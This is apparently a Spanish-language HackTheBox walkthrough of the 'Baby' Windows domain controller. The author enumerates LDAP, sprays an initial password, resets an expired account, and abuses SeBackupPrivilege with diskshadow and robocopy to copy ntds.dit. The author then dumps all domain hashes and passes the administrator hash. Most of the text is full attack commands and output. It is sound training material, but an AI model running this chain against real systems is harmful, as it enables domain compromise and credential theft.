Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #ldap #SeBackupPrivilege #ntdsdit #ad #password-spraying

![](assets/Pasted%20image%2020260120064009.png)

## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ ping -c 1 10.129.43.59
PING 10.129.43.59 (10.129.43.59) 56(84) bytes of data.
64 bytes from 10.129.43.59: icmp_seq=1 ttl=127 time=110 ms

--- 10.129.43.59 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.980/109.980/109.980/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.43.59 -oG nmap/allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49669/tcp open  unknown          syn-ack ttl 127
60303/tcp open  unknown          syn-ack ttl 127
60318/tcp open  unknown          syn-ack ttl 127
62344/tcp open  unknown          syn-ack ttl 127
62345/tcp open  unknown          syn-ack ttl 127
62354/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,60303,60318,62344,62345,62354 -sV -sC -Pn -n -vvv -sS 10.129.43.59 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-20 12:43:56Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Issuer: commonName=BabyDC.baby.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-19T12:39:28
| Not valid after:  2026-07-21T12:39:28
| MD5:   66d2:c4b0:6c66:4b43:a1b5:bbe6:e59c:802c
| SHA-1: d269:9a32:2d15:3877:0717:3b2d:347a:3bd6:b7e3:b0ba
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQVX8khdKZW45HmWhYO3JYJzANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5CYWJ5REMuYmFieS52bDAeFw0yNjAxMTkxMjM5MjhaFw0yNjA3
| MjExMjM5MjhaMBkxFzAVBgNVBAMTDkJhYnlEQy5iYWJ5LnZsMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAn8VQvAxt83or5dxvIMpDnwgsr2vGiX8pyJM/
| VRRkXOIs/0wihowFhR1Ht6VITsrBhuxW2KP6gnEqLn/Cw5t1w3oviSaE6qqFcuBM
| HQLwYJCk8TCJz3JBpiIVsY3ZP7A4+KfFnJXOHQyiajsGYiBpPNhXHH2lXGE6HcVK
| 2/H4Uhi40RIpNX3/lgN7SjPNpI2P6thmEwJjChD9XOBOxA2ifBn5yx1Adcrt9WGo
| i4s8sHbFvuc7CCAXr4D6hLvTRvdwQuC8tGTNWvYeTC0M7GsTmQ41St0gsycwg6lL
| vR0PIdx15PgzzPucBMKVAgdUB/NATj+0HnS7qz1kiJBuS6cOXQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAELsTocOvoVuqDsg22hLIy1/pmh5LOh5kVbSAvNzleO5e9/YYUn7AjiYeafB
| Eac8Fv8+vfQ1x5p/pGHzoxSyPobqxrortqNU+T97T+oAjdwzigp5Q1egK5JOTb0a
| JikYDQt7WQNcv8l+qENIX30D77G/G2kH9B1HP+ZKabS+Opx7H5RIXI8dTt7RBZ9Z
| d6XqPmj3Vfc33Dg74dIADr/bKdWQ+ZzUBZCCpivt7ucJsJHScDvZfW7a0lmlCfQv
| Ts5u3sBJkjqTyxusewrPi9LwD0i2BOepMRo/N2uGSqeT6+yxzNGLDx3G/YYJ5cHw
| SzG2HDfjiNGYEr1lgnNqmM12S+0=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-20T12:45:28+00:00; +3s from scanner time.
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-20T12:44:49+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60303/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60318/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62344/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
62345/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
62354/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-01-20T12:44:51
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29580/tcp): CLEAN (Timeout)
|   Check 2 (port 22329/tcp): CLEAN (Timeout)
|   Check 3 (port 35311/udp): CLEAN (Timeout)
|   Check 4 (port 58430/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
```

Por la informacion que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 636 LDAP
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB.

Saque informacion general de la maquina:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc smb 10.129.43.59
SMB         10.129.43.59    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
```

- Tenemos el dominio **baby.vl** y el nombre de la maquina **BABYC**

Voy a colocarlo en el /etc/hosts.

```bash
10.129.43.59 BABYDC.baby.vl baby.vl BABYDC
```

Trate de enumerar los shares haciendo uso de null session pero no tengo acceso al parecer:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc smb baby.vl -u '' -p '' --shares
SMB         10.129.43.59    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.43.59    445    BABYDC           [+] baby.vl\:
SMB         10.129.43.59    445    BABYDC           [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc smb baby.vl -u 'guest' -p '' --shares
SMB         10.129.43.59    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.43.59    445    BABYDC           [-] baby.vl\guest: STATUS_ACCOUNT_DISABLED
```

## Acceso Inicial.
### Puerto 636 LDAP.

A diferencia del SMB, LDAP si me permite enumerar los usuarios haciendo uso de una null session:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc ldap baby.vl -u '' -p '' --users
LDAP        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.43.59    389    BABYDC           [+] baby.vl\:
LDAP        10.129.43.59    389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.43.59    389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.129.43.59    389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.43.59    389    BABYDC           Jacqueline.Barnett            2021-11-21 15:11:03 0
LDAP        10.129.43.59    389    BABYDC           Ashley.Webb                   2021-11-21 15:11:03 0
LDAP        10.129.43.59    389    BABYDC           Hugh.George                   2021-11-21 15:11:03 0
LDAP        10.129.43.59    389    BABYDC           Leonard.Dyer                  2021-11-21 15:11:03 0
LDAP        10.129.43.59    389    BABYDC           Connor.Wilkinson              2021-11-21 15:11:08 0
LDAP        10.129.43.59    389    BABYDC           Joseph.Hughes                 2021-11-21 15:11:08 0
LDAP        10.129.43.59    389    BABYDC           Kerry.Wilson                  2021-11-21 15:11:08 0
LDAP        10.129.43.59    389    BABYDC           Teresa.Bell                   2021-11-21 15:14:37 0        Set initial password to BabyStart123!
```

- La descripción del usuario Teresa.Bell indica que hay una password inicial BabyStart123!

Probé las credenciales pero no me sirvieron:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc ldap baby.vl -u 'teresa.bell' -p 'BabyStart123!'
LDAP        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\teresa.bell:BabyStart123!

┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc smb baby.vl -u 'Teresa.Bell' -p 'BabyStart123!'
SMB        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
SMB        10.129.43.59    389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123!

```

Al ser una password inicial puedo tratar de sprayearla: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc ldap baby.vl -u users.txt -p 'BabyStart123!'
LDAP        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Guest:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123!
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123!
```

- Ninguna cuenta funciono.

Al enumerar todos los objetos note un usuario que no tengo en mi actual lista de users:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ netexec ldap baby.vl -u '' -p '' --query "(objectClass=*)" ""

LDAP        10.129.43.59    389    BABYDC           [+] Response for object: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

- Caroline.Robinson es un usuario que `nxc` no me mostro al usar el modulo `--users`.

Al probar la contraseña inicial con el usuario Caroline.Robinson veo lo siguiente:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc ldap baby.vl -u Caroline.Robinson -p 'BabyStart123!'
LDAP        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.43.59    389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```

- `STATUS_PASSWORD_MUST_CHANGE` me indica que la password es correcta, pero es necesario cambiarla antes de iniciar sesion con la cuenta.

Con `impacket-chanhepasswd` puedo cambiar la contraseña:

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ impacket-changepasswd baby.vl/Caroline.Robinson@10.129.43.59 -newpass 'w0nderi11ng23@'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of baby.vl\Caroline.Robinson
[*] Connecting to DCE/RPC as baby.vl\Caroline.Robinson
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

Y ahora puedo probar las credenciales en distintos servicios: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc ldap baby.vl -u 'Caroline.Robinson' -p 'w0nderi11ng23@'
LDAP        10.129.43.59    389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
LDAP        10.129.43.59    389    BABYDC           [+] baby.vl\Caroline.Robinson:w0nderi11ng23@ (Pwn3d!)

┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc winrm baby.vl -u 'Caroline.Robinson' -p 'w0nderi11ng23@'
WINRM       10.129.43.59    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.43.59    5985   BABYDC           [+] baby.vl\Caroline.Robinson:w0nderi11ng23@ (Pwn3d!)
```

- Las credenciales son validas para WinRm y LDAP.

Me voy a conectar por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ evil-winrm -i baby.vl -u 'Caroline.Robinson' -p 'w0nderi11ng23@'

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami
baby\caroline.robinson
```

## Escalada de Privilegios.

Al momento de enumerar mis privilegios note que tengo el privilegio de `SeBackupPrivilege`.

- Este privilegio me va a permitir crear copias de cualquier archivo.

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

En grupos puedo ver que pertenezco a Backup Operators:

```powershell
*Evil-WinRM* PS C:\Temp> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
BABY\it                                    Group            S-1-5-21-1407081343-4001094062-1444647654-1109 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
```
### Abusando de SeBackupPrivilege.


Una de las formas que tengo de abusar de este privilegio es crear copias de la `SAM` y `SYSTEM` para dumpear los hashes de las cuentas locales.

- Primero necesito crear las copias y descargarlas en mi sistema:

```powershell
*Evil-WinRM* PS C:\Temp> reg save hklm\sam c:\Temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Temp> download system.hive

Info: Downloading C:\Temp\system.hive to system.hive

Info: Download successful!
*Evil-WinRM* PS C:\Temp> download sam.hive

Info: Downloading C:\Temp\sam.hive to sam.hive

Info: Download successful!
```

Y con `impacket-secretsdump` puedo dumpear los hashes:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Al probar el hash del administrador me doy cuenta de que no sirve:

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ nxc smb baby.vl -u administrator -H '8d992faed38128ae85e95fa35868bb43'
SMB         10.129.43.59    445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False)
SMB         10.129.43.59    445    BABYDC           [-] baby.vl\administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

Por lo cual voy a tener que dumpear el `ntds.dit` para dumpear todos los hashes del dominio.

- Primero necesito crear el script para `diskshadow`: 

```bash
┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ cat script

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

┌──(wndr㉿wndr)-[~/Tools/RustHound-CE]
└─$ unix2dos script
unix2dos: converting file script to DOS format...
```

Ahora voy a subir el script y ejecutarlo con `diskshadow`:

```powershell
*Evil-WinRM* PS C:\Temp> upload script
*Evil-WinRM* PS C:\Temp> diskshadow /s C:\Temp\script

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {457b566e-5bf6-4b99-8c83-24cf7cb9926d}
The shadow copy was successfully exposed as E:\.
-> end backup
->
```

- Esto me genera una copia del disco `C:\` expuesta en `E:\`.

En este disco `E:\` se encuentra una copia del `ntds.dit` original el cual me puedo copiar a mi actual directorio y descargar:

```bash
*Evil-WinRM* PS C:\Temp> robocopy /b E:\Windows\ntds . ntds.dit

*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/20/2026   1:49 PM       16777216 ntds.dit
-a----         1/20/2026   1:28 PM          49152 sam.hive
-a----         1/20/2026   1:48 PM            191 script
-a----         1/20/2026   1:29 PM       20480000 system.hive


*Evil-WinRM* PS C:\Temp> download ntds.dit
```

Ahora con `impacket-secretsdump` puedo dumpear todos los hashes del dominio:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:65df3ea48f7284ce84c931dd8595dec9:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:b6a0577c38bdb2a9064ebbdcc60d107bb54cdb7599f16cf26e2f7247e5cc5913
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:535c8aaaa7af00b3ec4a15289d42fd9a
baby.vl\Caroline.Robinson:des-cbc-md5:434098707679bc97
[*] Cleaning up...
```

### Pass The Hash.

Ahora puedo probar el hash de la cuenta administrator:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ nxc winrm baby.vl -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
WINRM       10.129.43.59    5985   BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl)
WINRM       10.129.43.59    5985   BABYDC           [+] baby.vl\administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```

Ahora que tengo acceso me voy a conectar por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/baby]
└─$ evil-winrm -i baby.vl -u administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
baby\administrator
```

![](assets/Pasted%20image%2020260122111423.png)